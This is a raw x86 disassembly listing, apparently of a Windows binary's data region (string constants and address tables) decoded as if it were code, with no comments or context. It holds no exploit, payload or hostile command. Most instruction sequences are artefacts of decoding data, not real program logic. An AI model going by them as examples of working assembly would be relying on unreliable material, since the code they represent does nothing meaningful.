  42769f:	ss pop edi
  4276a1:	xor    BYTE PTR [eax+0x4c],cl
  4276a4:	pop    edi
  4276a5:	cmp    DWORD PTR [ebp+0x53],edx
  4276a8:	add    BYTE PTR [ebp+0x41],al
  4276ab:	dec    eax
  4276ac:	cmp    BYTE PTR [edi+0x35],bl
  4276af:	dec    esi
  4276b0:	push   ebx
  4276b1:	dec    ebx
  4276b2:	add    BYTE PTR [edi+0x38],dl
  4276b5:	xor    DWORD PTR [edi+0x48],ebx
  4276b8:	xor    DWORD PTR [ebp+0x4e],eax
  4276bb:	ss pop edi
  4276bd:	dec    eax
  4276be:	cmp    DWORD PTR [edx+0x0],eax
  4276c1:	push   esp
  4276c2:	aaa    
  4276c3:	xor    bh,BYTE PTR [ecx]
  4276c5:	xor    al,0x31
  4276c7:	pop    edi
  4276c8:	push   edx
  4276c9:	push   edi
  4276ca:	push   edx
  4276cb:	dec    ecx
  4276cc:	add    BYTE PTR [esi+0x4d],al
  4276cf:	push   edi
  4276d0:	pop    edi
  4276d1:	pop    ecx
  4276d2:	xor    eax,0x45395a
  4276d7:	pop    eax
  4276d8:	dec    eax
  4276d9:	aaa    
  4276da:	pop    edi
  4276db:	xor    dl,BYTE PTR [ebx+0x39]
  4276de:	xor    dh,BYTE PTR [esi]
  4276e0:	xor    eax,0x3936525f
  4276e5:	add    BYTE PTR [ebx+0x50],cl
  4276e8:	inc    ecx
  4276e9:	pop    edi
  4276ea:	xor    eax,0x364c3737
  4276ef:	xor    BYTE PTR [ecx+0x0],dl
  4276f2:	push   ebx
  4276f3:	push   ebx
  4276f4:	inc    ebx
  4276f5:	xor    bl,BYTE PTR [edi+0x57]
  4276f8:	xor    BYTE PTR [ecx+0x43],al
  4276fb:	push   esp
  4276fc:	xor    eax,0x414a004e
  427701:	inc    ecx
  427702:	pop    edi
  427703:	cmp    DWORD PTR [esi+0x32],edx
  427706:	pop    edi
  427707:	xor    bh,BYTE PTR [ecx]
  427709:	add    BYTE PTR [ebx+0x42],cl
  42770c:	dec    esp
  42770d:	pop    edi
  42770e:	push   esi
  42770f:	xor    eax,0x47004c55
  427714:	xor    ecx,DWORD PTR [eax+0x5f]
  427717:	push   ecx
  427718:	dec    edi
  427719:	push   esp
  42771a:	cmp    BYTE PTR [eax+0x5f],dl
  42771d:	dec    ecx
  42771e:	add    BYTE PTR [ebp+0x33],cl
  427721:	inc    ebp
  427722:	pop    edi
  427723:	inc    edi
  427724:	dec    edi
  427725:	xor    eax,0x455f3249
  42772a:	add    BYTE PTR [edx+0x47],cl
  42772d:	xor    eax,0x4338535f
  427732:	dec    ecx
  427733:	xor    dh,BYTE PTR [eax]
  427735:	pop    edi
  427736:	push   eax
  427737:	add    BYTE PTR [eax+0x0],dl
  42773a:	pop    eax
  42773b:	add    BYTE PTR [eax+eax*1+0x5f],al
  42773f:	add    BYTE PTR [eax+0x0],cl
  427742:	aaa    
  427743:	add    BYTE PTR [ecx+0x0],bl
  427746:	aaa    
  427747:	add    BYTE PTR [edi+0x0],bl
  42774a:	inc    esi
  42774b:	add    BYTE PTR [edi],dh
  42774d:	add    BYTE PTR [ecx+0x0],bl
  427750:	inc    esp
  427751:	add    BYTE PTR [edi+0x0],bl
  427754:	xor    eax,0x52000000
  427759:	add    BYTE PTR [eax+0x0],dl
  42775c:	inc    esi
  42775d:	add    BYTE PTR [edi+0x0],bl
  427760:	dec    esp
  427761:	add    BYTE PTR [ecx+0x0],al
  427764:	push   eax
  427765:	add    BYTE PTR [edi+0x0],bl
  427768:	inc    ecx
  427769:	add    BYTE PTR [edi],dh
  42776b:	add    BYTE PTR [eax+eax*1+0x4a],al
  42776f:	add    BYTE PTR [ebp+0x0],al
  427772:	pop    edi
  427773:	add    BYTE PTR [eax+eax*1],dh
  427776:	add    BYTE PTR [eax],al
  427778:	dec    esp
  427779:	add    BYTE PTR [edi],dh
  42777b:	add    BYTE PTR [ebp+0x0],cl
  42777e:	cmp    BYTE PTR [eax],al
  427780:	xor    al,BYTE PTR [eax]
  427782:	pop    edi
  427783:	add    BYTE PTR [eax],bh
  427785:	add    BYTE PTR [ecx+0x0],al
  427788:	pop    edx
  427789:	add    BYTE PTR [edx+0x0],bl
  42778c:	pop    edi
  42778d:	add    BYTE PTR [ebx],dh
  42778f:	add    BYTE PTR [ebx+0x0],dl
  427792:	add    BYTE PTR [eax],al
  427794:	push   esi
  427795:	add    BYTE PTR [eax],bh
  427797:	add    BYTE PTR [esi+0x0],dl
  42779a:	xor    al,BYTE PTR [eax]
  42779c:	pop    edi
  42779d:	add    BYTE PTR [esi+0x0],al
  4277a0:	inc    ebx
  4277a1:	add    BYTE PTR [edi+0x0],al
  4277a4:	push   edi
  4277a5:	add    BYTE PTR [edi+0x0],bl
  4277a8:	dec    eax
  4277a9:	add    BYTE PTR [edx+0x0],cl
  4277ac:	cmp    DWORD PTR [eax],eax
  4277ae:	aaa    
  4277af:	add    BYTE PTR [eax],al
  4277b1:	add    BYTE PTR [ecx+0x0],cl
  4277b4:	dec    edx
  4277b5:	add    BYTE PTR [ecx+0x0],al
  4277b8:	pop    edi
  4277b9:	add    BYTE PTR [edx+0x0],cl
  4277bc:	inc    esi
  4277bd:	add    BYTE PTR [edi+0x0],dl
  4277c0:	xor    eax,DWORD PTR [eax]
  4277c2:	dec    ebp
  4277c3:	add    BYTE PTR [edi+0x0],bl
  4277c6:	push   eax
  4277c7:	add    BYTE PTR [ecx+0x0],al
  4277ca:	add    BYTE PTR [eax],al
  4277cc:	dec    edi
  4277cd:	add    BYTE PTR [ecx+0x0],bl
  4277d0:	dec    eax
  4277d1:	add    BYTE PTR [edi+0x0],bl
  4277d4:	xor    eax,0x33005000
  4277d9:	add    BYTE PTR [esi+0x0],al
  4277dc:	push   esi
  4277dd:	add    BYTE PTR [edi+0x0],bl
  4277e0:	push   ebx
  4277e1:	add    BYTE PTR [ecx+0x0],dl
  4277e4:	push   ebp
  4277e5:	add    BYTE PTR [eax],al
  4277e7:	add    BYTE PTR [esi+0x0],al
  4277ea:	dec    esp
  4277eb:	add    BYTE PTR [ecx],dh
  4277ed:	add    BYTE PTR [edi+0x0],bl
  4277f0:	dec    ebx
  4277f1:	add    BYTE PTR [edx+0x0],dl
  4277f4:	inc    ebx
  4277f5:	add    BYTE PTR [edi+0x0],bl
  4277f8:	dec    edx
  4277f9:	add    BYTE PTR [eax],bh
  4277fb:	add    BYTE PTR [esi+0x0],dl
  4277fe:	cmp    DWORD PTR [eax],eax
  427800:	cmp    DWORD PTR [eax],eax
  427802:	add    BYTE PTR [eax],al
  427804:	dec    eax
  427805:	add    BYTE PTR [ecx+0x0],bl
  427808:	push   edx
  427809:	add    BYTE PTR [edi+0x0],bl
  42780c:	inc    esp
  42780d:	add    BYTE PTR [ebx+0x0],dl
  427810:	dec    edx
  427811:	add    BYTE PTR [ebx],dh
  427813:	add    BYTE PTR [eax],al
  427815:	add    BYTE PTR [eax+eax*1+0x5a],dl
  427819:	add    BYTE PTR [ecx+0x0],dl
  42781c:	pop    edi
  42781d:	add    BYTE PTR [ebx+0x0],dl
  427820:	cmp    BYTE PTR [eax],al
  427822:	dec    ebx
  427823:	add    BYTE PTR [eax+eax*1],dh
  427826:	xor    al,BYTE PTR [eax]
  427828:	add    BYTE PTR [eax],al
  42782a:	dec    ecx
  42782b:	add    BYTE PTR [eax+0x0],dl
  42782e:	xor    BYTE PTR [eax],al
  427830:	add    BYTE PTR ss:[edi+0x0],bl
  427834:	inc    esi
  427835:	add    BYTE PTR [ebp+0x0],dl
  427838:	inc    edx
  427839:	add    BYTE PTR [eax],al
  42783b:	add    BYTE PTR [edx+0x0],bl
  42783e:	xor    eax,DWORD PTR [eax]
  427840:	inc    ecx
  427841:	add    BYTE PTR [edi],dh
  427843:	add    BYTE PTR [edi+0x0],bl
  427846:	inc    edi
  427847:	add    BYTE PTR [edx+0x0],bl
  42784a:	xor    BYTE PTR [eax],al
  42784c:	push   edx
  42784d:	add    BYTE PTR [edi+0x0],bl
  427850:	aaa    
  427851:	add    BYTE PTR [edx+0x0],dl
  427854:	push   eax
  427855:	add    BYTE PTR [esi+0x0],cl
  427858:	dec    esi
  427859:	add    BYTE PTR [eax],al
  42785b:	add    BYTE PTR [eax+0x0],dl
  42785e:	cmp    DWORD PTR [eax],eax
  427860:	cmp    DWORD PTR [eax],eax
  427862:	xor    eax,DWORD PTR [eax]
  427864:	xor    al,0x0
  427866:	xor    eax,0x36003700
  42786b:	add    BYTE PTR ds:0x41005f00,dh
  427871:	add    BYTE PTR [ecx+0x0],al
  427874:	add    BYTE PTR [eax],al
  427876:	dec    edx
  427877:	add    BYTE PTR [esi+0x0],cl
  42787a:	pop    eax
  42787b:	add    BYTE PTR [edi+0x0],bl
  42787e:	inc    edi
  42787f:	add    BYTE PTR [ecx],bh
  427881:	add    BYTE PTR [edx+0x0],al
  427884:	pop    edx
  427885:	add    BYTE PTR [ebp+0x0],cl
  427888:	pop    edi
  427889:	add    BYTE PTR [ecx+0x0],dl
  42788c:	inc    ebp
  42788d:	add    BYTE PTR [ebp+0x0],dl
  427890:	add    BYTE PTR [eax],al
  427892:	push   eax
  427893:	add    BYTE PTR [eax+eax*1+0x38],al
  427897:	add    BYTE PTR [esi],dh
  427899:	add    BYTE PTR [edi+0x0],bl
  42789c:	xor    al,BYTE PTR [eax]
  42789e:	dec    eax
  42789f:	add    BYTE PTR [esi+0x0],cl
  4278a2:	dec    ecx
  4278a3:	add    BYTE PTR [eax],al
  4278a5:	add    BYTE PTR [eax],al
  4278a7:	xchg   esp,eax
  4278a8:	jne    0x4278ec
  4278aa:	add    BYTE PTR [eax-0x63ffbd8b],bl
  4278b0:	jne    0x4278f4
  4278b2:	add    BYTE PTR [eax-0x5bffbd8b],ah
  4278b8:	jne    0x4278fc
  4278ba:	add    BYTE PTR [eax-0x53ffbd8b],ch
  4278c0:	jne    0x427904
  4278c2:	add    BYTE PTR [eax+0x4275],dh
  4278c8:	add    BYTE PTR [eax],al
  4278ca:	add    BYTE PTR [ebp+esi*2-0x6d],cl
  4278ce:	dec    ebp
  4278cf:	add    BYTE PTR [eax],al
  4278d1:	add    BYTE PTR [eax],al
  4278d3:	add    al,BYTE PTR [eax]
  4278d5:	add    BYTE PTR [eax],al
  4278d7:	inc    edx
  4278d8:	add    BYTE PTR [eax],al
  4278da:	add    BYTE PTR [eax],al
  4278dc:	loopne 0x4278de
  4278de:	add    BYTE PTR [eax],al
  4278e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278e1:	add    BYTE PTR [eax],al
  4278e3:	add    BYTE PTR [eax],al
  4278e5:	add    BYTE PTR [eax],al
  4278e7:	aas    
  4278e8:	add    BYTE PTR [edx],0x0
  4278eb:	push   ecx
  4278ec:	add    BYTE PTR [edx],0x0
  4278ef:	imul   eax,DWORD PTR [edx-0x7d7efffe],0x82970002
  4278f9:	add    al,BYTE PTR [eax]
  4278fb:	stos   DWORD PTR es:[edi],eax
  4278fc:	add    BYTE PTR [edx],0x0
  4278ff:	add    BYTE PTR [eax],al
  427901:	add    BYTE PTR [eax],al
  427903:	rol    DWORD PTR [edx-0x7d20fffe],1
  427909:	add    al,BYTE PTR [eax]
  42790b:	jmp    0xf3427b92
  427910:	add    BYTE PTR [edx],0x0
  427913:	std    
  427914:	add    BYTE PTR [edx],0x0
  427917:	jae    0x835f791f
  42791d:	add    al,BYTE PTR [eax]
  42791f:	and    eax,0x35000283
  427924:	add    DWORD PTR [edx],0x0
  427927:	aas    
  427928:	add    DWORD PTR [edx],0x0
  42792b:	dec    ecx
  42792c:	add    DWORD PTR [edx],0x0
  42792f:	push   ebx
  427930:	add    DWORD PTR [edx],0x0
  427933:	pop    ebp
  427934:	add    DWORD PTR [edx],0x0
  427937:	add    DWORD PTR [bp+si],0x0
  42793b:	jno    0x4278c0
  42793d:	add    al,BYTE PTR [eax]
  42793f:	jns    0x4278c4
  427941:	add    al,BYTE PTR [eax]
  427943:	add    DWORD PTR [ebx-0x7c74fffe],0x83950002
  42794d:	add    al,BYTE PTR [eax]
  42794f:	lahf   
  427950:	add    DWORD PTR [edx],0x0
  427953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427954:	add    DWORD PTR [edx],0x0
  427957:	mov    ch,0x83
  427959:	add    al,BYTE PTR [eax]
  42795b:	rol    DWORD PTR [ebx-0x7c32fffe],0x2
  427962:	add    cl,bl
  427964:	add    DWORD PTR [edx],0x0
  427967:	jecxz  0x4278ec
  427969:	add    al,BYTE PTR [eax]
  42796b:	out    dx,eax
  42796c:	add    DWORD PTR [edx],0x0
  42796f:	std    
  427970:	add    DWORD PTR [edx],0x0
  427973:	pop    es
  427974:	test   BYTE PTR [edx],al
  427976:	add    BYTE PTR [ecx],dl
  427978:	test   BYTE PTR [edx],al
  42797a:	add    BYTE PTR [edi],bl
  42797c:	test   BYTE PTR [edx],al
  42797e:	add    BYTE PTR [edi],ah
  427980:	test   BYTE PTR [edx],al
  427982:	add    BYTE PTR [ecx],dh
  427984:	test   BYTE PTR [edx],al
  427986:	add    BYTE PTR [ebx],bh
  427988:	test   BYTE PTR [edx],al
  42798a:	add    BYTE PTR [ebp-0x7c],al
  42798d:	add    al,BYTE PTR [eax]
  42798f:	dec    ebp
  427990:	test   BYTE PTR [edx],al
  427992:	add    BYTE PTR [edi-0x7c],dl
  427995:	add    al,BYTE PTR [eax]
  427997:	popa   
  427998:	test   BYTE PTR [edx],al
  42799a:	add    BYTE PTR [ebx-0x7c],ch
  42799d:	add    al,BYTE PTR [eax]
  42799f:	jg     0x427925
  4279a1:	add    al,BYTE PTR [eax]
  4279a3:	mov    DWORD PTR [edx+eax*1+0x2849300],eax
  4279aa:	add    BYTE PTR [ebx-0x54fffd7c],bl
  4279b0:	test   BYTE PTR [edx],al
  4279b2:	add    BYTE PTR [eax],al
  4279b4:	add    BYTE PTR [eax],al
  4279b6:	add    cl,al
  4279b8:	test   BYTE PTR [edx],al
  4279ba:	add    cl,bl
  4279bc:	test   BYTE PTR [edx],al
  4279be:	add    bh,ah
  4279c0:	test   BYTE PTR [edx],al
  4279c2:	add    bl,bh
  4279c4:	test   BYTE PTR [edx],al
  4279c6:	add    BYTE PTR ds:0x1d000285,cl
  4279cc:	test   DWORD PTR [edx],eax
  4279ce:	add    BYTE PTR [edi],ch
  4279d0:	test   DWORD PTR [edx],eax
  4279d2:	add    BYTE PTR ds:0x51000285,bh
  4279d8:	test   DWORD PTR [edx],eax
  4279da:	add    BYTE PTR [ecx-0x7b],ah
  4279dd:	add    al,BYTE PTR [eax]
  4279df:	ja     0x427966
  4279e1:	add    al,BYTE PTR [eax]
  4279e3:	mov    eax,DWORD PTR [ebp-0x7a64fffe]
  4279e9:	add    al,BYTE PTR [eax]
  4279eb:	mov    ds:0xb9000285,eax
  4279f0:	test   DWORD PTR [edx],eax
  4279f2:	add    cl,cl
  4279f4:	test   DWORD PTR [edx],eax
  4279f6:	add    ch,dl
  4279f8:	test   DWORD PTR [edx],eax
  4279fa:	add    bh,ah
  4279fc:	test   DWORD PTR [edx],eax
  4279fe:	add    cl,dh
  427a00:	test   DWORD PTR [edx],eax
  427a02:	add    BYTE PTR [ebx],cl
  427a04:	xchg   BYTE PTR [edx],al
  427a06:	add    BYTE PTR [ecx],ah
  427a08:	xchg   BYTE PTR [edx],al
  427a0a:	add    BYTE PTR ds:0x45000286,dh
  427a10:	xchg   BYTE PTR [edx],al
  427a12:	add    BYTE PTR [ecx-0x7a],dl
  427a15:	add    al,BYTE PTR [eax]
  427a17:	popa   
  427a18:	xchg   BYTE PTR [edx],al
  427a1a:	add    BYTE PTR [ebp-0x7a],ch
  427a1d:	add    al,BYTE PTR [eax]
  427a1f:	jg     0x4279a7
  427a21:	add    al,BYTE PTR [eax]
  427a23:	lea    eax,[esi-0x7964fffe]
  427a29:	add    al,BYTE PTR [eax]
  427a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a2c:	xchg   BYTE PTR [edx],al
  427a2e:	add    BYTE PTR [ecx-0x32fffd7a],bh
  427a34:	xchg   BYTE PTR [edx],al
  427a36:	add    cl,bl
  427a38:	xchg   BYTE PTR [edx],al
  427a3a:	add    ch,ch
  427a3c:	xchg   BYTE PTR [edx],al
  427a3e:	add    bl,bh
  427a40:	xchg   BYTE PTR [edx],al
  427a42:	add    BYTE PTR ds:0x1d000287,cl
  427a48:	xchg   DWORD PTR [edx],eax
  427a4a:	add    BYTE PTR [ebx],ch
  427a4c:	xchg   DWORD PTR [edx],eax
  427a4e:	add    BYTE PTR [ecx-0x79],al
  427a51:	add    al,BYTE PTR [eax]
  427a53:	dec    ebp
  427a54:	xchg   DWORD PTR [edx],eax
  427a56:	add    BYTE PTR [ebx-0x79],ah
  427a59:	add    al,BYTE PTR [eax]
  427a5b:	jg     0x4279e4
  427a5d:	add    al,BYTE PTR [eax]
  427a5f:	xchg   ebx,eax
  427a60:	xchg   DWORD PTR [edx],eax
  427a62:	add    BYTE PTR [edi-0x44fffd79],ah
  427a68:	xchg   DWORD PTR [edx],eax
  427a6a:	add    cl,dl
  427a6c:	xchg   DWORD PTR [edx],eax
  427a6e:	add    cl,ch
  427a70:	xchg   DWORD PTR [edx],eax
  427a72:	add    bh,dh
  427a74:	xchg   DWORD PTR [edx],eax
  427a76:	add    BYTE PTR [ecx],cl
  427a78:	mov    BYTE PTR [edx],al
  427a7a:	add    BYTE PTR [edi],bl
  427a7c:	mov    BYTE PTR [edx],al
  427a7e:	add    BYTE PTR [ecx],dh
  427a80:	mov    BYTE PTR [edx],al
  427a82:	add    BYTE PTR [ebp-0x78],al
  427a85:	add    al,BYTE PTR [eax]
  427a87:	add    BYTE PTR [eax],al
  427a89:	add    BYTE PTR [eax],al
  427a8b:	mov    BYTE PTR gs:[edx],al
  427a8e:	add    BYTE PTR [ebx-0x78],dh
  427a91:	add    al,BYTE PTR [eax]
  427a93:	test   DWORD PTR [eax-0x7768fffe],ecx
  427a99:	add    al,BYTE PTR [eax]
  427a9b:	mov    ds:0xb5000288,eax
  427aa0:	mov    BYTE PTR [edx],al
  427aa2:	add    bh,al
  427aa4:	mov    BYTE PTR [edx],al
  427aa6:	add    bl,bl
  427aa8:	mov    BYTE PTR [edx],al
  427aaa:	add    bh,ah
  427aac:	mov    BYTE PTR [edx],al
  427aae:	add    ch,dh
  427ab0:	mov    BYTE PTR [edx],al
  427ab2:	add    BYTE PTR [ecx],al
  427ab4:	mov    DWORD PTR [edx],eax
  427ab6:	add    BYTE PTR [ebx],dl
  427ab8:	mov    DWORD PTR [edx],eax
  427aba:	add    BYTE PTR [ecx],ah
  427abc:	mov    DWORD PTR [edx],eax
  427abe:	add    BYTE PTR [edi],ch
  427ac0:	mov    DWORD PTR [edx],eax
  427ac2:	add    BYTE PTR [ebx-0x77],cl
  427ac5:	add    al,BYTE PTR [eax]
  427ac7:	pop    ebx
  427ac8:	mov    DWORD PTR [edx],eax
  427aca:	add    BYTE PTR [ebp-0x77],dh
  427acd:	add    al,BYTE PTR [eax]
  427acf:	test   DWORD PTR [ecx-0x7664fffe],ecx
  427ad5:	add    al,BYTE PTR [eax]
  427ad7:	stos   DWORD PTR es:[edi],eax
  427ad8:	mov    DWORD PTR [edx],eax
  427ada:	add    BYTE PTR [edi-0x34fffd77],dh
  427ae0:	mov    DWORD PTR [edx],eax
  427ae2:	add    bl,ah
  427ae4:	mov    DWORD PTR [edx],eax
  427ae6:	add    bh,ch
  427ae8:	mov    DWORD PTR [edx],eax
  427aea:	add    bh,bh
  427aec:	mov    DWORD PTR [edx],eax
  427aee:	add    BYTE PTR [ebx],cl
  427af0:	mov    al,BYTE PTR [edx]
  427af2:	add    BYTE PTR [edi],dl
  427af4:	mov    al,BYTE PTR [edx]
  427af6:	add    BYTE PTR ds:0x2f00028a,ah
  427afc:	mov    al,BYTE PTR [edx]
  427afe:	add    BYTE PTR [edi],bh
  427b00:	mov    al,BYTE PTR [edx]
  427b02:	add    BYTE PTR [ecx-0x76],dl
  427b05:	add    al,BYTE PTR [eax]
  427b07:	pop    ebp
  427b08:	mov    al,BYTE PTR [edx]
  427b0a:	add    BYTE PTR [edi-0x76],ch
  427b0d:	add    al,BYTE PTR [eax]
  427b0f:	jnp    0x427a9b
  427b11:	add    al,BYTE PTR [eax]
  427b13:	xchg   DWORD PTR [edx-0x7568fffe],ecx
  427b19:	add    al,BYTE PTR [eax]
  427b1b:	lods   eax,DWORD PTR ds:[esi]
  427b1c:	mov    al,BYTE PTR [edx]
  427b1e:	add    BYTE PTR [ebx-0x32fffd76],bh
  427b24:	mov    al,BYTE PTR [edx]
  427b26:	add    ch,bl
  427b28:	mov    al,BYTE PTR [edx]
  427b2a:	add    ch,ch
  427b2c:	mov    al,BYTE PTR [edx]
  427b2e:	add    BYTE PTR [ecx],cl
  427b30:	mov    eax,DWORD PTR [edx]
  427b32:	add    BYTE PTR [ecx],bl
  427b34:	mov    eax,DWORD PTR [edx]
  427b36:	add    BYTE PTR [ecx],ch
  427b38:	mov    eax,DWORD PTR [edx]
  427b3a:	add    BYTE PTR [edi],dh
  427b3c:	mov    eax,DWORD PTR [edx]
  427b3e:	add    BYTE PTR [ebp-0x75],cl
  427b41:	add    al,BYTE PTR [eax]
  427b43:	pop    ebx
  427b44:	mov    eax,DWORD PTR [edx]
  427b46:	add    BYTE PTR [ebp-0x75],ah
  427b49:	add    al,BYTE PTR [eax]
  427b4b:	jno    0x427ad8
  427b4d:	add    al,BYTE PTR [eax]
  427b4f:	or     DWORD PTR [ebx-0x7464fffe],0x2
  427b56:	add    BYTE PTR [ebp-0x42fffd75],ch
  427b5c:	mov    eax,DWORD PTR [edx]
  427b5e:	add    cl,dl
  427b60:	mov    eax,DWORD PTR [edx]
  427b62:	add    cl,ah
  427b64:	mov    eax,DWORD PTR [edx]
  427b66:	add    bh,dh
  427b68:	mov    eax,DWORD PTR [edx]
  427b6a:	add    BYTE PTR ds:0x1900028c,al
  427b70:	mov    WORD PTR [edx],es
  427b72:	add    BYTE PTR [edi],ah
  427b74:	mov    WORD PTR [edx],es
  427b76:	add    BYTE PTR [ecx],bh
  427b78:	mov    WORD PTR [edx],es
  427b7a:	add    BYTE PTR [ebx-0x74],cl
  427b7d:	add    al,BYTE PTR [eax]
  427b7f:	pop    ebp
  427b80:	mov    WORD PTR [edx],es
  427b82:	add    BYTE PTR [ecx-0x74],ch
  427b85:	add    al,BYTE PTR [eax]
  427b87:	ja     0x427b15
  427b89:	add    al,BYTE PTR [eax]
  427b8b:	lea    ecx,[edx+eax*1+0x28ca100]
  427b92:	add    BYTE PTR [ebp-0x38fffd74],dh
  427b98:	mov    WORD PTR [edx],es
  427b9a:	add    cl,dl
  427b9c:	mov    WORD PTR [edx],es
  427b9e:	add    bl,ah
  427ba0:	mov    WORD PTR [edx],es
  427ba2:	add    bh,dh
  427ba4:	mov    WORD PTR [edx],es
  427ba6:	add    BYTE PTR [ebx],cl
  427ba8:	lea    eax,[edx]
  427baa:	add    BYTE PTR [ebx],bl
  427bac:	lea    eax,[edx]
  427bae:	add    BYTE PTR [ecx],ch
  427bb0:	lea    eax,[edx]
  427bb2:	add    BYTE PTR [ebx-0x73],al
  427bb5:	add    al,BYTE PTR [eax]
  427bb7:	pop    ebx
  427bb8:	lea    eax,[edx]
  427bba:	add    BYTE PTR [ecx-0x73],ch
  427bbd:	add    al,BYTE PTR [eax]
  427bbf:	jnp    0x427b4e
  427bc1:	add    al,BYTE PTR [eax]
  427bc3:	mov    DWORD PTR [ebp-0x726afffe],ecx
  427bc9:	add    al,BYTE PTR [eax]
  427bcb:	scas   eax,DWORD PTR es:[edi]
  427bcc:	lea    eax,[edx]
  427bce:	add    cl,al
  427bd0:	lea    eax,[edx]
  427bd2:	add    bl,dl
  427bd4:	lea    eax,[edx]
  427bd6:	add    bl,ah
  427bd8:	lea    eax,[edx]
  427bda:	add    bl,dh
  427bdc:	lea    eax,[edx]
  427bde:	add    ch,bh
  427be0:	lea    eax,[edx]
  427be2:	add    BYTE PTR ds:0x1f00028e,cl
  427be8:	mov    es,WORD PTR [edx]
  427bea:	add    BYTE PTR [edi],ch
  427bec:	mov    es,WORD PTR [edx]
  427bee:	add    BYTE PTR [ebp-0x72],al
  427bf1:	add    al,BYTE PTR [eax]
  427bf3:	pop    ebp
  427bf4:	mov    es,WORD PTR [edx]
  427bf6:	add    BYTE PTR [edi-0x72],ch
  427bf9:	add    al,BYTE PTR [eax]
  427bfb:	jg     0x427b8b
  427bfd:	add    al,BYTE PTR [eax]
  427bff:	xchg   ecx,eax
  427c00:	mov    es,WORD PTR [edx]
  427c02:	add    BYTE PTR [edi-0x4efffd72],bl
  427c08:	mov    es,WORD PTR [edx]
  427c0a:	add    BYTE PTR [edi-0x2efffd72],bh
  427c10:	mov    es,WORD PTR [edx]
  427c12:	add    bl,ah
  427c14:	mov    es,WORD PTR [edx]
  427c16:	add    bh,dh
  427c18:	mov    es,WORD PTR [edx]
  427c1a:	add    BYTE PTR [ebx],cl
  427c1c:	pop    DWORD PTR [edx]
  427c1e:	add    BYTE PTR ds:0x3300028f,bl
  427c24:	pop    DWORD PTR [edx]
  427c26:	add    BYTE PTR [ebp-0x71],al
  427c29:	add    al,BYTE PTR [eax]
  427c2b:	popa   
  427c2c:	pop    DWORD PTR [edx]
  427c2e:	add    BYTE PTR [edi-0x71],dh
  427c31:	add    al,BYTE PTR [eax]
  427c33:	test   DWORD PTR [edi-0x7066fffe],ecx
  427c39:	add    al,BYTE PTR [eax]
  427c3b:	add    BYTE PTR [eax],al
  427c3d:	add    BYTE PTR [eax],al
  427c3f:	mov    bl,0x8f
  427c41:	add    al,BYTE PTR [eax]
  427c43:	ret    
  427c44:	pop    DWORD PTR [edx]
  427c46:	add    bl,bl
  427c48:	pop    DWORD PTR [edx]
  427c4a:	add    ch,ah
  427c4c:	pop    DWORD PTR [edx]
  427c4e:	add    ch,dh
  427c50:	pop    DWORD PTR [edx]
  427c52:	add    BYTE PTR [ecx],cl
  427c54:	nop
  427c55:	add    al,BYTE PTR [eax]
  427c57:	pop    ss
  427c58:	nop
  427c59:	add    al,BYTE PTR [eax]
  427c5b:	sub    edx,DWORD PTR [eax-0x6fc0fffe]
  427c61:	add    al,BYTE PTR [eax]
  427c63:	dec    edi
  427c64:	nop
  427c65:	add    al,BYTE PTR [eax]
  427c67:	pop    ebp
  427c68:	nop
  427c69:	add    al,BYTE PTR [eax]
  427c6b:	addr16 nop
  427c6d:	add    al,BYTE PTR [eax]
  427c6f:	jns    0x427c01
  427c71:	add    al,BYTE PTR [eax]
  427c73:	lea    edx,[eax-0x6f66fffe]
  427c79:	add    al,BYTE PTR [eax]
  427c7b:	scas   eax,DWORD PTR es:[edi]
  427c7c:	nop
  427c7d:	add    al,BYTE PTR [eax]
  427c7f:	ret    
  427c80:	nop
  427c81:	add    al,BYTE PTR [eax]
  427c83:	rcl    DWORD PTR [eax-0x6f1afffe],1
  427c89:	add    al,BYTE PTR [eax]
  427c8b:	stc    
  427c8c:	nop
  427c8d:	add    al,BYTE PTR [eax]
  427c8f:	add    eax,0x11000291
  427c94:	xchg   ecx,eax
  427c95:	add    al,BYTE PTR [eax]
  427c97:	daa    
  427c98:	xchg   ecx,eax
  427c99:	add    al,BYTE PTR [eax]
  427c9b:	xor    eax,0x41000291
  427ca0:	xchg   ecx,eax
  427ca1:	add    al,BYTE PTR [eax]
  427ca3:	push   ebx
  427ca4:	xchg   ecx,eax
  427ca5:	add    al,BYTE PTR [eax]
  427ca7:	imul   edx,DWORD PTR [ecx-0x6e88fffe],0x918b0002
  427cb1:	add    al,BYTE PTR [eax]
  427cb3:	fwait
  427cb4:	xchg   ecx,eax
  427cb5:	add    al,BYTE PTR [eax]
  427cb7:	stos   DWORD PTR es:[edi],eax
  427cb8:	xchg   ecx,eax
  427cb9:	add    al,BYTE PTR [eax]
  427cbb:	mov    ecx,0xc3000291
  427cc0:	xchg   ecx,eax
  427cc1:	add    al,BYTE PTR [eax]
  427cc3:	int    0x91
  427cc5:	add    al,BYTE PTR [eax]
  427cc7:	fst    DWORD PTR [ecx-0x6e1afffe]
  427ccd:	add    al,BYTE PTR [eax]
  427ccf:	not    DWORD PTR [ecx-0x6df2fffe]
  427cd5:	add    al,BYTE PTR [eax]
  427cd7:	daa    
  427cd8:	xchg   edx,eax
  427cd9:	add    al,BYTE PTR [eax]
  427cdb:	aaa    
  427cdc:	xchg   edx,eax
  427cdd:	add    al,BYTE PTR [eax]
  427cdf:	inc    ecx
  427ce0:	xchg   edx,eax
  427ce1:	add    al,BYTE PTR [eax]
  427ce3:	push   ecx
  427ce4:	xchg   edx,eax
  427ce5:	add    al,BYTE PTR [eax]
  427ce7:	arpl   WORD PTR [edx-0x6d8efffe],dx
  427ced:	add    al,BYTE PTR [eax]
  427cef:	mov    edx,DWORD PTR [edx+0x2]
  427cf5:	add    BYTE PTR [eax],al
  427cf7:	inc    edx
  427cf8:	xor    al,0x10
  427cfa:	add    cl,dl
  427cfc:	add    dl,BYTE PTR [eax]
  427cfe:	add    BYTE PTR [edi],bh
  427d00:	jge    0x427d12
  427d02:	add    BYTE PTR ds:0xe1001070,dl
  427d08:	jae    0x427d1a
  427d0a:	add    BYTE PTR [esi-0x52ffeff5],al
  427d10:	jae    0x427d22
  427d12:	add    BYTE PTR [edx+0x25],ah
  427d15:	adc    BYTE PTR [eax],al
  427d17:	je     0x427d44
  427d19:	adc    BYTE PTR [eax],al
  427d1b:	sahf   
  427d1c:	jp     0x427d2e
  427d1e:	add    BYTE PTR [edi],ch
  427d20:	adc    BYTE PTR [eax],dl
	...
  427d2a:	add    BYTE PTR [ebp+esi*2-0x6d],cl
  427d2e:	dec    ebp
